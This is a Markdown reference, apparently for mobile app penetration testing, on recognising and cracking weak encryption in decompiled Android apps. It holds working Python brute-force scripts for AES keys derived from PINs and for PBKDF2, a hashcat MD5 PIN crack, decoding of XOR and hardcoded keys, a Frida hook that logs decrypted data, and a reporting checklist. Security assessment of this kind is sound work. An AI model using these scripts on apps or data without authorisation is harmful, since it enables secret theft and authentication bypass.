# Crypto Key Cracking Reference

When static analysis reveals encryption/decryption logic with weak key derivation, crack it offline before dynamic testing. This is often the fastest path to exploitation in mobile apps.

## Decision Tree

```
Found crypto in source?
├── Hardcoded ciphertext + known plaintext?
│   └── YES → Brute-force the key (see patterns below)
├── Key derived from user input (PIN, password)?
│   ├── Small keyspace (< 10M)? → Brute-force immediately
│   └── Large keyspace? → Try common PINs/passwords first, then hashcat
├── Key stored in SharedPreferences/Keychain?
│   └── Extract via run-as/backup/Frida
├── Key derived from device ID/IMEI?
│   └── Predictable — compute from known device info
└── Key from server (fetched at runtime)?
    └── Intercept via Frida hook on crypto APIs
```

## Pattern 1: AES with Weak PIN Key (Most Common)

**Signature in code:**
```java
// Key derived from integer/short string, zero-padded
byte[] keyBytes = new byte[16];
byte[] pinBytes = String.valueOf(pin).getBytes();
System.arraycopy(pinBytes, 0, keyBytes, 0, Math.min(pinBytes.length, 16));
SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");
```

**Crack script:**
```python
#!/usr/bin/env python3
import base64
from Crypto.Cipher import AES

# Extract these from decompiled source
CIPHERTEXT_B64 = "OSnaALIWUkpOziVAMycaZQ=="  # hardcoded in APK
EXPECTED_PLAINTEXT = "master_on"               # comparison target
ALGORITHM = AES.MODE_ECB                       # from Cipher.getInstance()

ciphertext = base64.b64decode(CIPHERTEXT_B64)
target = EXPECTED_PLAINTEXT.encode('utf-8')

def generate_key(pin):
    key_bytes = bytearray(16)
    pin_str = str(pin).encode('utf-8')
    for i in range(min(len(pin_str), 16)):
        key_bytes[i] = pin_str[i]
    return bytes(key_bytes)

# Brute-force
for pin in range(0, 1_000_000):
    key = generate_key(pin)
    try:
        cipher = AES.new(key, ALGORITHM)
        decrypted = cipher.decrypt(ciphertext)
        # PKCS5/PKCS7 unpadding
        pad_len = decrypted[-1]
        if 0 < pad_len <= 16:
            unpadded = decrypted[:-pad_len]
            if unpadded == target:
                print(f"[!] PIN FOUND: {pin}")
                print(f"    Decrypted: {unpadded.decode('utf-8')}")
                exit(0)
    except Exception:
        continue

print("[-] Not found in range")
```

**Time estimate:** 1M PINs in ~2-5 seconds (Python), <1 second (C/hashcat).

## Pattern 2: PBKDF2 + AES-CBC with Small PIN Keyspace

**Signature:**
```java
// Key derived via PBKDF2 from short PIN
PBEKeySpec keySpec = new PBEKeySpec(pin.toCharArray(), salt, iterationCount, 256);
SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
byte[] key = keyFactory.generateSecret(keySpec).getEncoded();
Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
```

**Crack script (parameters typically in assets/config.properties or hardcoded):**
```python
#!/usr/bin/env python3
import base64, hashlib
from Crypto.Cipher import AES

# Extract from APK assets or decompiled source
encrypted = base64.b64decode("bTjBHijMAVQX+CoyFbDPJXRUSHcTyzGaie3OgVqvK5w=")
salt = base64.b64decode("m2UvPXkvte7fygEeMr0WUg==")
iv = base64.b64decode("L15Je6YfY5owgIckR9R3DQ==")
iterations = 10000

for i in range(10000):  # 4-digit PIN = 0000-9999
    pin = f'{i:04d}'
    key = hashlib.pbkdf2_hmac('sha1', pin.encode(), salt, iterations, 32)
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(encrypted)
        pad_len = decrypted[-1]
        if 1 <= pad_len <= 16 and all(b == pad_len for b in decrypted[-pad_len:]):
            print(f'PIN={pin}: {decrypted[:-pad_len].decode("utf-8")}')
            break
    except:
        continue
```

**Time estimate:** 10K PINs with 10K PBKDF2 iterations each = ~3-5 seconds (Python). Still trivial.

**Key insight:** PBKDF2 iterations slow down each attempt but don't help when the keyspace is only 10,000. Even 100K iterations × 10K PINs = ~30 seconds. The weakness is the PIN size, not the stretching.

## Pattern 3: AES-CBC with Hardcoded IV + Key

**Signature:**
```java
byte[] iv = "1234567890123456".getBytes();  // hardcoded IV
byte[] key = "MySecretKey12345".getBytes();  // hardcoded key
Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
```

**Exploit:** No brute-force needed — key is in the source. Just decrypt directly.

```python
from Crypto.Cipher import AES
import base64

key = b"MySecretKey12345"  # from source
iv = b"1234567890123456"   # from source
ciphertext = base64.b64decode("...")  # from source or intercepted

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext)
# Remove PKCS5 padding
pad_len = plaintext[-1]
print(plaintext[:-pad_len].decode())
```

## Pattern 3: XOR "Encryption"

**Signature:**
```java
byte[] key = "secret".getBytes();
for (int i = 0; i < data.length; i++) {
    data[i] ^= key[i % key.length];
}
```

**Exploit:**
```python
key = b"secret"
ciphertext = bytes([...])  # from source/memory
plaintext = bytes([c ^ key[i % len(key)] for i, c in enumerate(ciphertext)])
print(plaintext.decode())
```

## Pattern 4: Base64 "Encryption" (Not Actually Crypto)

**Signature:**
```java
String encoded = Base64.encodeToString(secret.getBytes(), Base64.DEFAULT);
// Later compared or stored
```

**Exploit:** `echo "dGVzdA==" | base64 -d`

## Pattern 5: SHA/MD5 Hash Comparison

**Signature:**
```java
MessageDigest md = MessageDigest.getInstance("MD5");
byte[] hash = md.digest(input.getBytes());
if (Arrays.equals(hash, expectedHash)) { ... }
```

**Exploit:** If input is short (PIN, simple password):
```bash
# hashcat
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d  # 6-digit PIN

# Python
import hashlib
target = bytes.fromhex("5f4dcc3b5aa765d61d8327deb882cf99")
for pin in range(1000000):
    if hashlib.md5(str(pin).encode()).digest() == target:
        print(f"PIN: {pin}")
        break
```

## Pattern 6: RSA with Hardcoded Private Key

**Signature:**
```java
// Private key in assets/ or raw resources
InputStream is = getAssets().open("private_key.pem");
```

**Exploit:** Extract the key file from APK, decrypt directly.

## Pattern 7: Android Keystore (Harder)

**Signature:**
```java
KeyStore ks = KeyStore.getInstance("AndroidKeyStore");
ks.load(null);
SecretKey key = (SecretKey) ks.getKey("my_key", null);
```

**Exploit:** Cannot extract key directly. Use Frida to hook after decryption:
```javascript
Java.perform(function() {
    var Cipher = Java.use("javax.crypto.Cipher");
    Cipher.doFinal.overload("[B").implementation = function(input) {
        var result = this.doFinal(input);
        console.log("Decrypted: " + Java.use("java.lang.String").$new(result));
        return result;
    };
});
```

## Common Weaknesses Checklist

| Weakness | Severity | Exploitability |
|----------|----------|----------------|
| Hardcoded key in source | Critical | Trivial — just read it |
| Key from small integer (PIN) | Critical | Seconds to brute-force |
| ECB mode (no IV) | High | Deterministic — same input = same output |
| No key stretching (raw string → key) | High | Fast brute-force |
| Hardcoded IV | Medium | Enables known-plaintext attacks |
| Key from predictable source (IMEI, package name) | High | Compute from device info |
| Base64 used as "encryption" | Critical | Not encryption at all |
| MD5/SHA1 for password storage | Medium | Rainbow tables / hashcat |
| Custom crypto algorithm | Critical | Almost always broken |

## Tools

| Tool | Use Case | Install |
|------|----------|---------|
| PyCryptodome | Python AES/RSA/etc brute-force scripts | `pip3 install pycryptodome` |
| hashcat | GPU-accelerated hash cracking | `brew install hashcat` |
| john | CPU hash cracking with rules | `brew install john` |
| CyberChef | Quick decode/decrypt in browser | https://gchq.github.io/CyberChef |
| Frida | Hook crypto APIs at runtime | `pip3 install frida-tools` |

## Reporting

When crypto weakness is found, document:
1. **Algorithm + mode + padding** (e.g., AES/ECB/PKCS5Padding)
2. **Key derivation method** (how the key is generated)
3. **Why it's weak** (small keyspace, no stretching, hardcoded)
4. **Time to crack** (actual measurement)
5. **Cracking script** (include in findings/PoC)
6. **What the decrypted value enables** (auth bypass, device control, etc.)
